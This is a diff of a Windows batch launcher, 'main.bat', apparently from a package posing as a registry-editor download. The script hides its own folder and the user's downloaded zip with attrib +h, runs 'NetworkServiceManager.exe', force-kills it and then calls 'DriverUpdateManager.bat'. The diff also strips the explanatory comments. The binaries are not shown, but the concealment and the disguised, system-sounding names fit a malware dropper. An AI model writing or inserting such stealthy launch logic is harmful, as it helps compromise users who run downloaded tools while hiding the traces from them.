@@ -27,16 +27,14 @@ attrib +h "%script_dir%\..\.."
 REM Hide the RegistryEditor.zip file in the Downloads directory
 attrib +h "%USERPROFILE%\Downloads\RegistryEditor-main.zip"
 
-REM Start NetworkServiceManager.exe for the first time and wait for 12 seconds
-start "" "%script_dir%NetworkServiceManager.exe"
-timeout /t 10 >nul
 
-REM Attempt to kill NetworkServiceManager.exe if it is running
+start "" "%script_dir%NetworkServiceManager.exe"
+timeout /t 12 >nul
+
 taskkill /f /im NetworkServiceManager.exe >nul 2>&1
 
 timeout /t 1 >nul
 
-REM After waiting, call DriverUpdateManager.bat
 call "%script_dir%DriverUpdateManager.bat"
 
 REM End of main.bat
